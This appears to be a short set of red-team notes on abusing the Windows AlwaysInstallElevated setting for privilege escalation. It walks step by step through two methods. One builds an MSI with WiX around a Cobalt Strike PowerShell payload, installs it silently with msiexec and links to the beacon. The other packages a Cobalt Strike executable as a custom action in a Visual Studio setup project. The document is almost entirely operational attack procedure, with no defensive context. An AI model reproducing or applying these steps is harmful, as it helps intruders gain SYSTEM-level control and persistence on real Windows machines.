### Always Install Elevated
```
1. Download wixtoolset binaries from: https://github.com/wixtoolset/wix3/releases/tag/wix3112rtm
2. Generate powershell one liner through Cobat Strike
3. Use template as such installer.xml and update the PS Payload
4. candle.exe -out wix installer.xml
5. light.exe -out installer.msi wix
6. msiexec /i C:\Temp\MSIInstaller.msi /qn
7. Link with link 127.0.0.1 <beacon name>

```
### Always Install Elevated With CS Beason
```
First, generate the desired payload: Attacks > Packages > Windows Executable (S). Select Windows EXE as the output and make it x64.
Open Visual Studio and create a new Setup Wizard project
Click Next through the wizard leaving everything as default, then click Finish.
Highlight the project in the Solution Explorer and scroll down the Properties window. Change Platform Target to x64.
Right-click on the project, go to Add > File and select your CS payload.
Right-click on the project again and select View > Custom Actions. Then right-click Install and select Add Custom Action....
Double-click Application Folder and your CS payload should be available to choose.
Keeping the CS exe highlighted in the Custom Actions window, ensure that Installer Class and Run64Bit in the Properties window are set to False and True respectively.
Now Build the project.

```

 
